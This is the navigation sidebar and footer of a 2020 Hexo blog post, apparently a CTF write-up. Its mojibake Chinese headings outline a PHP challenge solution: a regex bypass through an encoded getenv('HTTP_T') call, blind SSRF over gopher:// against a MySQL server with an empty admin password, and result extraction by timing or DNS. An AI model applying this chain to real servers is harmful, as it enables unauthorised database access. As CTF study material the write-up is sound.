class="nav-text">(ä¸readfile(&quot;co&lt;&lt;&quot;)ç›¸åŒ)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-3"><span class="nav-number">1.2.44.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#config-phpçš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL-æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL-Serverå¹¶ä¸”è·å–ç»“æœã€‚"><span class="nav-number">1.2.45.</span> <span class="nav-text">config.phpçš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL Serverå¹¶ä¸”è·å–ç»“æœã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯adminå¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨gopher-åè®®æ¥SSRFå»æŸ¥è¯¢mysql-serverã€‚"><span class="nav-number">1.2.46.</span> <span class="nav-text">å¹¶ä¸”æˆ‘ä»¬çŸ¥é“è¿™ä¸ªuseræ˜¯adminå¹¶ä¸”å¯†ç æ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨gopher://åè®®æ¥SSRFå»æŸ¥è¯¢mysql serverã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚"><span class="nav-number">1.2.47.</span> <span class="nav-text">ä½†æ˜¯gopherçš„payloadæ˜¯ååˆ†é•¿çš„ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°getenv"><span class="nav-number">1.2.48.</span> <span class="nav-text">å¦‚æœä½ å°è¯•å»æœç´¢å…¨éƒ¨çš„PHPå‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³è¿™ä¸ªæ­£åˆ™è§„åˆ™å’Œé•¿åº¦é™åˆ¶ï¼Œä½ å°†ä¼šå‘ç°ä¸€ä¸ªå¯ç”¨çš„å‡½æ•°getenv()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚"><span class="nav-number">1.2.49.</span> <span class="nav-text">è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªç‰¹åˆ«çš„å¤´éƒ¨å€¼ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP-header"><span class="nav-number">1.2.50.</span> <span class="nav-text">å› æ­¤æˆ‘ä»¬èƒ½å°†æˆ‘ä»¬çš„gopherçš„payloadæ”¾åˆ°è¿™ä¸ªHTTP header:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18"><span class="nav-number">1.2.51.</span> <span class="nav-text">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB) (length: 18)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å®ƒç­‰ä»·äºgetenv-quot-HTTP-T-quot-ã€‚"><span class="nav-number">1.2.52.</span> <span class="nav-text">å®ƒç­‰ä»·äºgetenv(&quot;HTTP_T&quot;)ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-4"><span class="nav-number">1.2.53.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š"><span class="nav-number">1.2.54.</span> <span class="nav-text">ç°åœ¨æˆ‘ä»¬å¯ä»¥SSRFï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼"><span class="nav-number">1.2.55.</span> <span class="nav-text">ç°åœ¨ï¼Œæ‚¨æœ‰ä¸€ä¸ªç›²ç›®çš„SSRFï¼</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚"><span class="nav-number">1.2.56.</span> <span class="nav-text">å¯¹äºMySQLåè®®ï¼Œå¯ä»¥ä½¿ç”¨Gopherusä¹‹ç±»çš„ä¸€äº›å·¥å…·æ¥åˆ›å»ºgopherè´Ÿè½½ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚"><span class="nav-number">1.2.57.</span> <span class="nav-text">æœ€åï¼Œæ‚¨åªéœ€è¦ä½¿ç”¨åŸºäºæ—¶é—´æˆ–å¸¦å¤–ï¼ˆDNSæ—¥å¿—ï¼‰çš„æ–¹æ³•æ¥æå–æŸ¥è¯¢ç»“æœã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ€åçš„è„šæœ¬ï¼š"><span class="nav-number">1.2.58.</span> <span class="nav-text">æœ€åçš„è„šæœ¬ï¼š</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">152.6k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
